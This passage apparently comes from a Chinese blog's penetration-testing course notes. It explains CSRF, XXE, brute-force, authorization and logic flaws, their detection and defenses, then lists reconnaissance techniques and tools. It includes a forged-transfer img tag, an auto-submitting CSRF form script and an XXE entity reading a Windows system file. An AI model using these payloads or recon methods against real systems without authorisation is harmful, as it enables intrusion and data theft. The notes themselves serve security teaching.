href="#CSRF客户端伪造请求" class="headerlink" title="CSRF客户端伪造请求"></a>CSRF客户端伪造请求</h1><h2 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>CSRF：客户端请求伪造，是一种对恶意脚本的一种利用方式。</p><p><strong>简单来说：就是受害者在登录状态下，且服务端没有进行token和refer校验，攻击者利用CSRF漏洞构造恶意的连接诱导客户者点击，以受害者信息执行特定的操作。</strong></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="/img/oldboy/ef9eed0b772951bc593c5d9f7c348c84.jpeg" alt="在这里插入图片描述"></p><p><strong>攻击的本质</strong></p><ol><li>在CSRF攻击中，攻击者诱使用户的浏览器发起一个恶意请求，本质上是借助用户的凭证，以用户的身份去执行特定的操作。</li><li>在用户访问攻击者构造的恶意页面时，如果此时浏览器访问第三方站点带上了第三方的Cookie，那么第三方站点会认为这是一个已登录的用户的访问请求，浏览器就可顺利完成请求操作，因此该攻击方式叫做“跨站请求伪造”。</li><li>在整个攻击过程中，攻击者并没有拿到受害者的身份凭证，也拿不到操作后的返回结果(同源策略)，攻击者只是诱使受害者发出了一个特定的请求。</li></ol><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="GET类型"><a href="#GET类型" class="headerlink" title="GET类型"></a>GET类型</h3><p>GET类型的漏洞类似于XSS漏洞（只不过需要受害者在登陆状态）</p><p><strong>仅需要构造HTTP请求，诱导用户在登陆状态下点击，即可构造CSRF攻击</strong></p><p>简单示例：</p><p>银行站点A：它以GET请求来完毕银行转账的操作，如：</p><blockquote><p><a href="http://www.mybank.com/Transfer.php?toBankId=11&money=1000">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a> </p></blockquote><p>攻击者构造：</p><blockquote><p>&lt;img src&#x3D;<a href="http://www.mybank.com/Transfer.php?toBankId=113&money=1000%3E">http://www.mybank.com/Transfer.php?toBankId=113&amp;money=1000&gt;</a></p></blockquote><p>首先。你登录了银行站点A，然后访问危险站点B，这时你会发现你的银行账户少了1000块。</p><h3 id="POST类型"><a href="#POST类型" class="headerlink" title="POST类型"></a>POST类型</h3><p>这样的错误观点形成的原因主要在于，大多数CSRF攻击发起时，使用的HTML标签都是&lt;image&gt;、&lt;iframe&gt;、&lt;script&gt;等带“src”属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。</p><p>而对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是$_REQUEST，而非$_POST获取变量，则会存在这个问题。</p><p>例如：</p><blockquote><form action=" / register" id="register" method="post" ><input type=text name="username" value="" /><input type=password name="password" value="" /><input type=submit name="submit" value="submit" /></form></blockquote><p>攻击者可以尝试构造一个GET请求</p><blockquote><p>http: &#x2F;&#x2F;host&#x2F;register?username&#x3D;test&amp;password&#x3D;passwd</p></blockquote><p>若无法构造成功，可以通过Burp构造post类型的CSRF攻击：</p><blockquote><form action="http: / / www . a.com/register" id="register" method="post" ><input type=text name="username" value=""/><input type=password name="password" value=""/><input type=submit name="submit" value="submit"/></ form><script>var f = document.getElementById ( "register");f.inputs [0].value = "test";f.inputs [1].value = "passwd" ;f.submit ();</script></blockquote><h2 id="漏洞挖掘-2"><a href="#漏洞挖掘-2" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1、最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞。</p><p>2、如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p><p>3、随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下:</p><p>使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。</p><p>如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p><h2 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。</p><h3 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h3><p>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p><h3 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h3><p>Referer字段用来记录该HTTP请求的来源地址。</p><ul><li>验证referer通过———&gt;合法请求</li><li>验证referer不通过———&gt;不合法请求</li></ul><h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="XXE介绍"><a href="#XXE介绍" class="headerlink" title="XXE介绍"></a>XXE介绍</h2><p>XML被称为可扩展标记语⾔，与HTML类似，但是HTML中的标签都是预定义(预先定义好每个标签的作⽤)的，⽽XML语⾔中的标签都是⾃定义(可以⾃⼰定义标签的名称、属性、值、作⽤)的；HTML中的标签可以是单标</p><p>签，⽽XML中的标签必须是成对出现。</p><p>​HTML语⾔主要⽤来展示内容，⽽XML语⾔⽤来传输数据。</p><h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><p>语法规则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">XML语⾔严格区分⼤⼩写，⽽HTML语⾔不区分⼤⼩写;</span><br><span class="line">XML语⾔只能有⼀个根标签;</span><br><span class="line">HTML语⾔中的属性值可以不⽤引号引起来，但是XML语⾔中的属性值必须⽤引号引起来；</span><br><span class="line">XML中的标签必须成对出现;</span><br><span class="line"> HTML：</span><br><span class="line"> &lt;img 属性=&quot;属性的值&quot;&gt;</span><br><span class="line"> XML：</span><br><span class="line"> &lt;security&gt;&lt;/security&gt;</span><br><span class="line">XML会对特殊字符进⾏实体转义，需要转义的字符如下：</span><br><span class="line">标签之间不能交叉编写;</span><br></pre></td></tr></table></figure><img src="/img/oldboy/image-20250312135416815.png" alt="image-20250312135416815" style="zoom: 25\%;" /><p>文档结构</p><p>​XML文档有xml声明、DTD文档类型、文档元素三部分组成。</p><h4 id="XML文档声明"><a href="#XML文档声明" class="headerlink" title="XML文档声明"></a>XML文档声明</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ecoding=&quot;utf-8&quot; ?&gt; </span><br><span class="line">&lt;!-- 声明部分可有可无，但是建议写上--&gt;</span><br></pre></td></tr></table></figure><h4 id="DTD文档类型"><a href="#DTD文档类型" class="headerlink" title="DTD文档类型"></a>DTD文档类型</h4><h5 id="DTD文档中的关键字"><a href="#DTD文档中的关键字" class="headerlink" title="DTD文档中的关键字"></a>DTD文档中的关键字</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DOCTYPE（DTD的声明）</span><br><span class="line">ENTITY（实体的声明）</span><br><span class="line">ELEMENT（定义元素）</span><br><span class="line">SYSTEM、PUBLIC（外部资源申请）</span><br></pre></td></tr></table></figure><p>XML文档元素</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;urf-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE security [</span><br><span class="line">&lt;?ELEMENT security (network,OS,websec,LAN)&gt;]&gt;</span><br><span class="line">&lt;security&gt;</span><br><span class="line">&lt;network&gt;1&lt;/network&gt;</span><br><span class="line">&lt;OS&gt;1&lt;/OS&gt;</span><br><span class="line">&lt;websec&gt;web&lt;/websec&gt;</span><br><span class="line">    &lt;LAN&gt;lan&lt;/LAN&gt;</span><br><span class="line">&lt;/security&gt;</span><br></pre></td></tr></table></figure><h4 id="DTD声明类型"><a href="#DTD声明类型" class="headerlink" title="DTD声明类型"></a>DTD声明类型</h4><h5 id="内部声明"><a href="#内部声明" class="headerlink" title="内部声明"></a>内部声明</h5><p>语法格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>案例如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE security [</span><br><span class="line">&lt;!ELEMENT security (network,OS,websec,LAN)&gt;</span><br><span class="line"><span class="meta prompt_">]&gt;</span></span><br></pre></td></tr></table></figure><h5 id="外部声明"><a href="#外部声明" class="headerlink" title="外部声明"></a>外部声明</h5><p>语法格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;外部⽂件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>案例如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/windows/system.ini&quot;&gt;</span><br><span class="line"><span class="meta prompt_">]&gt;</span></span><br></pre></td></tr></table></figure><h5 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h5><p>参数实体⽤“% 实体名称”声明，引⽤时也⽤“% 实体名称”；其余实体直接⽤实体名称声明，引⽤时⽤“&amp;实体名称;”。参数实体只能在DTD中声明，DTD中引⽤；其余实体只能在DTD中声明，可以在XML⽂档中引⽤。所谓的实体就是预先定义好的数据或者数据的集合。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内部实体：&lt;!ENTITY 实体名称 “实体的值”&gt;</span><br><span class="line">外部实体：&lt;!ENTITY 实体名称 SYSTEM “URL”&gt;</span><br><span class="line">参数实体：&lt;!ENTITY \% 实体名称 “实体的值”&gt;或者&lt;!ENTITY \% 实体名称 SYSTEM “URL” &gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞基础"><a href="#漏洞基础" class="headerlink" title="漏洞基础"></a>漏洞基础</h2><p>1、漏洞形成原因</p><p>XXE被称为外部实体注⼊漏洞。XXE漏洞的形成主要是程序在解析XML⽂档输⼊时，没有禁⽌外部实体的加载，导致可加载外部的恶意⽂件，造成⽂件读取、命令执⾏、内⽹端⼝扫描、攻击内⽹⽹站。</p><p>2、支持的伪协议</p><p><img src="/img/oldboy/image-20250312141105892.png" alt="image-20250312141105892"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file:⽤来加载本地⽂件</span><br><span class="line">http:⽤来加载远程⽂件</span><br><span class="line">ftp:⽤来访问ftp服务器上的⽂件</span><br><span class="line">php:⽤来读取php源码,php://filter</span><br></pre></td></tr></table></figure><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ol><li>探测内网端口</li><li>攻击内网网站</li><li>任意读取本地文件&#x2F;远程读取文件</li><li>读取PHP源码</li></ol><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1、经用是外部实体</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP：libxml_disable_entity_loader(true);</span><br><span class="line">java:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">python:</span><br><span class="line">rom lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure><p>2、过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">预定义字符转义：&lt; &amp;lt; &gt; &amp;gt; &amp; &amp;amp; ‘ &amp;apos; “ &amp;quot;</span><br><span class="line">过滤⽤户提交的XML数据，关键词：SYSTEM和PUBLIC</span><br><span class="line">禁⽤外部实体：libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="漏洞介绍-3"><a href="#漏洞介绍-3" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>暴力破解：实际上就是使用枚举方法，将密码逐个进行猜解，获取真正密码。</p><h3 id="C-S架构破解"><a href="#C-S架构破解" class="headerlink" title="C&#x2F;S架构破解"></a>C&#x2F;S架构破解</h3><p> C&#x2F;S即客户端&#x2F;服务器,基于C&#x2F;S架构的应用程序 如 ssh ftp sql-server mysql 等，这些服务往往提供一个高权限的用户，而这个高权限的用户往往可以进行执行命令的操作，如 sql-server 的 sa ，mysql的root，oracle的sys和system帐号，使用这些高权限的用户能在很大程度上给开发人员带来方便，但如果口令被破解带来的危害也是相当大的。</p><p>C&#x2F;S架构主要使用的破解工具 <strong>Hydra、Bruter、X-scan</strong></p><h3 id="B-S架构破解"><a href="#B-S架构破解" class="headerlink" title="B&#x2F;S架构破解"></a>B&#x2F;S架构破解</h3><p>一般是对web应用程序中的高权限用户进行猜解，如网站的内容管理系统账户。一般针对 B&#x2F;S的暴力猜解，使用Burp Suit 镜像表单爆破。</p><p>API接口暴力猜解参考   <a href="https://xz.aliyun.com/t/6330">https://xz.aliyun.com/t/6330</a></p><p><strong>破解方法</strong></p><ul><li><p><strong>基于表单的暴力破解</strong></p><p>直接使用暴力破解工具即可</p></li><li><p><strong>基于验证码的暴力破解</strong></p><ul><li>on client常见问题<ul><li>在前端进行验证码验证；不安全的将验证码泄露在cookie中；不安全的将验证码在前端源代码中泄露</li></ul></li><li>on server常见问题<ul><li>验证码在后台不过期，导致长时间使用（php默认session时间为24分钟）；验证码校验不严格，逻辑出现问题；验证码过于简单</li></ul></li><li>弱特证码识别攻击</li></ul></li><li><p><strong>基于token破解</strong></p><p>由于token值输出在前端源代码中，容易被获取，因此也就失去了防暴力破解的意义，一般Token在防止CSRF上会有比较好的功效。</p></li></ul><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>查找漏洞前注意事项</strong></p><ol><li>首先需要一个有效的字典（如top10常用密码字典）</li><li>判断暴力破解的页面的密码复杂度</li><li>网站是否存在验证码</li><li>是否对登录行为有限制</li><li>是否有token，双因素等验证信息</li></ol><p><strong>登录页面可能产生的漏洞</strong></p><img src="/img/oldboy/image-20250315215838059.png" alt="image-20250315215838059" style="zoom: 65\%;" /><h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><ol><li>强制要求输入验证码，否则，必须实施IP策略。 注意不要被X-Forwaded-For绕过了！</li><li>验证码只能用一次，用完立即过期！不能再次使用</li><li>验证码不要太弱。扭曲、变形、干扰线条、干扰背景色、变换字体等。</li><li>大网站最好统一安全验证码，各处使用同一个验证码接口。</li></ol><h1 id="越权与逻辑漏洞"><a href="#越权与逻辑漏洞" class="headerlink" title="越权与逻辑漏洞"></a>越权与逻辑漏洞</h1><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><h3 id="越权基础"><a href="#越权基础" class="headerlink" title="越权基础"></a>越权基础</h3><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称为越权操作</p><p>形成原因：后台使用了不合理的权限校验规则导致的（没有验证session会话信息&#x2F;验证权限）。</p><p><strong>权限分类</strong></p><p>平行越权:</p><p>​A用户和B用户属于同一级别的用户，但各自不能操作对方的个人信息，A用户如果可以操作B用户的个人信息的情况称为水平越权。</p><p>​简而言之：可以对相同权限的用户进行操作。</p><p>​防御方法：可以使用session会话来进行校验是否为同一用户操作。</p><p>垂直越权：</p><p>​A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。</p><p>​简而言之：对比自己权限高的用户进行操作。</p><p>​防御方法：对用户权限和身份信息进行校验。</p><h3 id="越权发现"><a href="#越权发现" class="headerlink" title="越权发现"></a>越权发现</h3><p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1NzgyMzA0OA==&mid=2247487316&idx=1&sn=a26a2a40ebade542c94b6a0c00d30f9a&chksm=fc2eaa73cb592365bab11302efc94e86a024fc73e6aee8a09be693432e25b7ff40be46dcb714&mpshare=1&srcid=0307h5NtXaku1riA6ObM2e1l&sharer_sharetime=1646647976027&sharer_shareid=9dabdbed893bcfec2f742c97df072b91&from=singlemessage&scene=1&subscene=10000&clicktime=1646705651&enterid=1646705651#rd">支付逻辑漏洞思路小集合</a></p><p><img src="/img/oldboy/image-20250316171220849.png" alt="image-20250316171220849"></p><p>确定业务流程—&gt;寻找流程中可以被操控的环节—&gt;分析可被操控环节中可能产生的逻辑问题—&gt;尝试修改参数触发逻辑问题</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 老男孩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 老男孩安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>老男孩--信息收集(1)</title>
      <link href="/2025/05/12/oldboy1/"/>
      <url>/2025/05/12/oldboy1/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ol><li>本文章由GeekY编写，仅供学习和研究使用,请勿使用项目的技术手段用于非法用途,任何人造成的任何负面影响,与本人无关。</li><li>本文档所有内容、新闻皆不代表本人态度、立场</li><li>不会收取任何广告费用,展示的所有工具链接与本人无任何利害关系</li></ol><h2 id="理论部分"><a href="#理论部分" class="headerlink" title="理论部分"></a>理论部分</h2><h3 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h3><p>1.明确目标</p><p>​确定范围：渗透测试的目标范围、IP、域名、内外网</p><p>​确定规则：可以渗透到什么程度、时间有什么要求？是否可以修改上传（木马是否允许上传）？能否提权等</p><p>​确定需求：web应用的漏洞（新上线的程序）？业务逻辑漏洞（针对业务的）？</p><p>​通知客户数据库备份、源代码备份</p><p>​禁止登陆扫描</p><p>​降低扫描线程</p><p>​增删改一定要手工进行</p><p>​禁止脱裤、跑数据、传shell、发起DOS、DDOS攻击</p><p>2.信息收集</p><p>​收集方式：主动扫描、开放搜索（利用搜索引擎获得后台、未授权页面、敏感URL等）</p><p>​基础信息：IP，网段，域名，端口</p><p>​系统信息：操作系统版本</p><p>​应用信息：各端口的应用，如web应用、邮件应用、DNS服务等</p><p>​版本信息：所有这些探测到的版本</p><p>​人员信息：域名注册人员信息，web应用中网站发帖人ID，管理员姓名等</p><p>​防护信息：是否能测试到防护设备</p><p>3.漏洞探测</p><p>​漏扫：AWVS、IBM appscan</p><p>​系统漏洞：未及时打补丁</p><p>​web漏洞：web应用开发问题</p><p>​结合漏洞寻找poc</p><p>4.漏洞验证（需要确认）</p><p>​将上述所有漏洞全部验证一遍</p><p>​自动化验证：结合自动化工具进行验证</p><p>​手工验证：SQL注入，XSS测试</p><p>​登录猜解：弱密码</p><p>5.信息分析</p><p>​用漏洞实行精准打击</p><p>​定制攻击路径、绕过检测机制、攻击代码</p><p>6.获取所需</p><p>​获取内部信息：基础设施（网络连接、vpn、路由、拓扑）</p><p>​进一步渗透：内网入侵，敏感目标</p><p>​清理痕迹：清理相关日志和木马、上传文件等</p><p>7.信息整理</p><p>​整理渗透工具：用的代码，poc，exp等</p><p>​整理收集信息：整理收集到的信息</p><p>​整理漏洞信息：整理渗透过程中的漏洞</p><p>8.形成报告</p><p>​漏洞成因，验证过程，带来的危害分析、修补建议</p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="二级域名-二级域名、C端、旁站、"><a href="#二级域名-二级域名、C端、旁站、" class="headerlink" title="二级域名 二级域名、C端、旁站、"></a>二级域名 二级域名、C端、旁站、</h4><h5 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a>二级域名</h5><p><strong>收集子域名方法一： DNS域传送漏洞</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过kail 的dnsenum工具获取dns域中域名</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kali&gt; </span><span class="language-bash">dnsenum 【域名】</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意收集的域名信息包含CDN的IP地址，需要进行过滤</span></span><br><span class="line">CDN：简单理解为WEB网站的缓存服务器，分布在不同节点实现网站的快速访问</span><br></pre></td></tr></table></figure><p><strong>收集子域名方法二：备案号查询</strong></p><p><img src="/img/oldboy/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250216140219.png"></p><p>查询网址：</p><p>​<a href="http://icp.bugscaner.com/">ICP网站域名备案查询网</a></p><p>​<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>​<a href="https://icp.aizhan.com/">icp备案查询_网站备案查询_域名备案查询_APP备案查询_小程序备案查询_快应用备案查询_爱站网</a></p><p>​<a href="http://cha.fute.com/index">http://cha.fute.com/index</a></p><p>​<a href="https://0.zone/">零零信安 | ASM | 攻击面 | 外部攻击面管理专家 | 比攻击者更快一步了解您自己的风险</a></p><blockquote><p>注意：备案号一般存放在门户网站的最底部</p></blockquote><p><strong>收集子域名方法三：SSL证书</strong></p><p>SSL证书查找方法：</p><p><img src="/img/oldboy/1-2.png"></p><p><img src="/img/oldboy/1-3.png"></p><p><img src="/img/oldboy/1-4.png"></p><p>寻找方法：</p><p>​①找到渗透门户网站，点击锁图标查看https的证书信息</p><p>​②点击右上角证书图标，找到证书字段中的序列号</p><p>​③需要将改字段值转换为十进制，通过Burp Suit软件、在线转换工具直接转换即可</p><p>查询网站：</p><p>​<a href="https://myssl.com/ssl.html">SSL状态检测</a></p><p>​<a href="https://www.chinassl.net/ssltools/ssl-checker.html">SSL证书在线检测工具-中国数字证书CHINASSL</a></p><p><strong>收集子域名方法四：利用反编译工具收集域名信息</strong></p><p>​通过AndroidKiller反编译器，里面可以查找相关的公司域名和ip地址信息</p><p><strong>收集子域名方法五：微信公众号提取</strong></p><p>​通过开启手机代理，实现BurpSuit与手机的联动，抓包分析</p><p>​搜狗：<a href="https://weixin.sogou.com/">https://weixin.sogou.com</a></p><p><strong>收集子域名方法六：暴力破解</strong></p><p>​即利用枚举法通过字典的形式，进行暴力破解，获取二级域名</p><p>查询网站：</p><p>​<a href="https://scan.javasec.cn/">在线子域名爆破-JAVASEC</a></p><p>​<a href="https://rapiddns.io/subdomain">Subdomain - RapidDNS Rapid DNS Information Collection</a></p><p>​<a href="https://chaziyu.com/">子域名查询 查子域名 查子站 子域名大全 二级域名查询 查子域</a></p><p>​<a href="https://www.dnsgrep.cn/subdomain">子域名查询 - dnsgrep</a></p><p>​<a href="https://dnsdumpster.com/">DNSDumpster - Find &amp; lookup dns records for recon &amp; research</a></p><p>​</p><p>工具：</p><ul><li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li><li>ksudbomain：<a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></li><li>subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li><li>Sublist3r:  <a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li><li>子域名挖掘机：<a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a></li><li>dirsearch：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li></ul><p><strong>收集子域名方法七：利用域名信息历史注册记录</strong></p><p>查询网站：</p><p>​<a href="https://whois.chinaz.com/">域名Whois查询 - 站长工具</a></p><p>​<a href="https://www.godaddy.com/zh-sg/offers/whois-b?isc=sem3year&countryview=1&currencyType=CNY&cdtl=c_20419696261.g_150582122103.k_kwd-10506105019.a_710479444795.d_c.ctv_g&bnb=nb&gad_source=1&gclid=EAIaIQobChMIwoj3uMbHiwMVz9oWBR2NACzqEAAYASAAEgLThPD_BwE">WHOIS 域名查询 - 查找网站所有者 - GoDaddy CN</a></p><p>​<a href="https://zh.whois-history.whoisxmlapi.com/lookup">通过WHOIS历史信息查询访问域名历史 | WhoisXML API</a></p><p><strong>收集子域名方法八：利用域名信息历史注册记录</strong></p><p>1）百度 谷歌</p><p>​site:oldboyedu.com  –根据主域信息进行检索</p><p>​intitle：老男孩教育   –根据企业名称进行检索</p><p>2） <strong>空间搜索引擎</strong></p><ul><li><p>FOFA: <a href="https://fofa.info/">https://fofa.info</a></p></li><li><p>Quake：<a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a></p></li><li><p>Shadon：<a href="https://www.shodan.io/">https://www.shodan.io</a></p><ul><li>基础语法：<a href="https://blog.csdn.net/Vdieoo/article/details/109622838">https://blog.csdn.net/Vdieoo/article/details/109622838</a></li></ul></li><li><p>ZoomEye：<a href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p></li></ul><p><strong>收集子域名方法九：利用网站js文件提取二级域名</strong></p><p>工具：</p><p>​<a href="https://github.com/Threezh1/JSFinder">jfFinder</a></p><h5 id="C端、旁站收集"><a href="#C端、旁站收集" class="headerlink" title="C端、旁站收集"></a>C端、旁站收集</h5><p>​获取其他域名信息&#x2F;获取其他局域网主机地址信息</p><p>在线网站：</p><p>​<a href="https://tool.chinaz.com/same">网站IP查询_IP反查域名_同IP网站查询 - 站长工具</a></p><p>​<a href="https://site.ip138.com/">域名查iP 域名解析 iP查询网站 iP反查域名 iP反查网站 同一iP网站 同iP网站域名iP查询</a></p><p>​</p><p>工具：</p><p>​<a href="https://gobies.org/">Goby— 资产绘测及实战化漏洞扫描工具</a></p><p>​<a href="https://github.com/foryujian/yujianportscan">御剑</a></p><p>​<a href="https://nmap.org/">Nmap: the Network Mapper - Free Security Scanner</a></p><p>​K8、IISPutScanner(前提条件要获取到网站的真实ip)</p><h5 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h5><p>​<a href="https://x.threatbook.com/">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a></p><p>​<a href="https://ti.360.cn/">360安全大脑</a></p><p>​<a href="https://ti.qianxin.com/">奇安信威胁情报中心</a></p><h4 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h4><h5 id="Web源代码泄露"><a href="#Web源代码泄露" class="headerlink" title="Web源代码泄露"></a><strong>Web源代码泄露</strong></h5><p>​1）收集源代码备份信息</p><p>​利用7kbscan工具</p><p>​2）收集特定站点目录中的扩展文件</p><p>​.git 目录信息泄露，也可以通过（GitHack）.git目录获取源代码</p><p>​.DS_store 仿照7kbscan字典形式创建&#x2F;【目录名】&#x2F;.DS_store字典并进行扫描</p><p>​通过 ds_store_exp.py 【.DS_store路径】递归下载到本地</p><p>​.svn 仿照7kbscan字典形式创建.svp字典并进行扫描</p><p>​通过seay svn添加网站实现源码下载</p><p>​.hg等……</p><p>​3）社工信息泄露</p><p>​泄露敏感信息注册到一些网站（手机号 身份号 QQ 微信）</p><h5 id="GooleHack"><a href="#GooleHack" 